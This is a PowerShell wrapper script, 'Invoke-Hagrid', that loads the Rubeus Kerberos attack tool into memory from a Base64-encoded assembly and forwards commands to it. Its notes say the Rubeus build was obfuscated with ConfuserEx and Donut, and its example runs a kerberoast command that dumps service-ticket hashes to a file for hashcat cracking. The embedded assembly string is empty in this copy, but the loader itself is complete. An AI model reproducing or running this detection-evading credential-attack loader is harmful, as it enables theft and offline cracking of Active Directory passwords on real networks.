<#
.Synopsis
   Wrapper for Rubeus Version 2.3.0
.EXAMPLE
   Import-Module .\Invoke-Hagrid.ps1
   OR
   . .\Invoke-Hagrid.ps1
   Invoke-Hagrid -command 'kerberoast /format:hashcat /outfile:C:\Temp\allKERB.txt'
.NOTES
    For more examples see Rubeus documentation https://github.com/GhostPack/Rubeus
    This version of Invoke-Hagrid uses the build of Rubeus from OffensivePipeline, so it was ran through ConfuserEx, Donut etc. 
    https://github.com/Aetsu/OffensivePipeline
#>
$RubeusAssembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String(""))


function Invoke-Hagrid
{
    Param
    (
         [Parameter(Mandatory=$false)]
         [string]$Command = "currentluid"
    )

    [Rubeus.Program]::Main("$Command".Split())
}

Write-Host "You can now use Invoke-Hagrid -Command 'CAMMMAND_HERE'"
